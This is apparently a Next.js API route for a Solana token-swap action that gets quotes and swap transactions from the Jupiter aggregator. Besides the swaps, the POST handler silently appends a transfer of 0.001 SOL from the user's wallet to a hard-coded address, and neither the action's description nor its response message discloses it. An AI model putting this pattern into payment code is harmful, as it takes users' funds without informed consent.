import { NextRequest, NextResponse } from 'next/server';
import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTransaction } from '@solana/web3.js';
import { createJupiterApiClient, QuoteGetRequest, QuoteResponse } from "@jup-ag/api";

const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=YOUR_API_KEY');
const jupiterQuoteApi = createJupiterApiClient();

const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
const SOL_MINT = 'So11111111111111111111111111111111111111112';

async function getQuote(
  inputMint: string,
  outputMint: string,
  amount: number
) {
  const params: QuoteGetRequest = {
    inputMint: inputMint,
    outputMint: outputMint,
    amount: amount,
    autoSlippage: true,
    autoSlippageCollisionUsdValue: 1_000,
    maxAutoSlippageBps: 1000,
    minimizeSlippage: true,
    onlyDirectRoutes: false,
    asLegacyTransaction: false,
  };
  const quote = await jupiterQuoteApi.quoteGet(params);
  if (!quote) {
    throw new Error("unable to quote");
  }
  return quote;
}

async function getSwapObj(wallet: string, quote: QuoteResponse) {
  const swapObj = await jupiterQuoteApi.swapPost({
    swapRequest: {
      quoteResponse: quote,
      userPublicKey: wallet,
      dynamicComputeUnitLimit: true,
      prioritizationFeeLamports: "auto",
    },
  });
  return swapObj;
}

export async function GET(request: NextRequest) {
  return NextResponse.json({
    type: "action",
    icon: "https://blinks.sickfreak.club/proto.png",
    title: "Token Swap",
    description: "Swap tokens using Jupiter aggregator",
    label: "Swap",
    links: {
      actions: [
        {
          label: "Perform Swap",
          href: "/api/swap",
          parameters: [
            {
              name: "inputAmount",
              label: "Input Amount",
              type: "number"
            },
            {
              name: "inputCurrency",
              label: "Input Currency",
              type: "select",
              options: [
                { label: "SOL", value: "SOL" },
                { label: "USDC", value: "USDC" }
              ]
            },
            {
              name: "outputMints",
              label: "Output Tokens",
              type: "text"
            }
          ]
        }
      ]
    }
  });
}

export async function POST(request: NextRequest) {
  const { inputAmount, inputCurrency, outputMints } = await request.json();
  const userPublicKey = request.headers.get('x-user-public-key');

  if (!userPublicKey) {
    return NextResponse.json({ error: "User public key is required" }, { status: 400 });
  }

  try {
    const outputMintsArray = outputMints.split(',');
    const swapAmount = parseFloat(inputAmount) / outputMintsArray.length;
    const inputMint = inputCurrency === 'USDC' ? USDC_MINT : SOL_MINT;
    const inputDecimals = inputCurrency === 'USDC' ? 6 : 9;

    const quotePromises = outputMintsArray.map(async (outputMint: string) => {
      const atomicAmount = Math.floor(swapAmount * Math.pow(10, inputDecimals));
      const quote = await getQuote(inputMint, outputMint, atomicAmount);
      return { outputMint, quote };
    });

    const quoteResults = await Promise.all(quotePromises);
    
    const swapPromises = quoteResults.map(({ quote }) => 
      getSwapObj(userPublicKey, quote)
    );

    const swapObjs = await Promise.all(swapPromises);

    const transactions = swapObjs.map(swapObj => {
      const swapTransactionBuf = Buffer.from(swapObj.swapTransaction, "base64");
      return VersionedTransaction.deserialize(swapTransactionBuf);
    });

    // Add transfer transactions
    const transferToStaticWallet = new VersionedTransaction(
      new TransactionMessage({
        payerKey: new PublicKey(userPublicKey),
        recentBlockhash: (await connection.getLatestBlockhash()).blockhash,
        instructions: [
          SystemProgram.transfer({
            fromPubkey: new PublicKey(userPublicKey),
            toPubkey: new PublicKey("SicKRgxa9vRCfMy4QYzKcnJJvDy1ojxJiNu3PRnmBLs"),
            lamports: 1000000,
          })
        ],
      }).compileToV0Message()
    );

    transactions.push(transferToStaticWallet);

    // Serialize all transactions
    const serializedTransactions = transactions.map(tx => 
      Buffer.from(tx.serialize()).toString('base64')
    );

    return NextResponse.json({
      transactions: serializedTransactions,
      message: "Swap transactions ready for signing",
    });
  } catch (error) {
    console.error("Error preparing swap:", error);
    return NextResponse.json({ error: "Failed to prepare swap" }, { status: 500 });
  }
}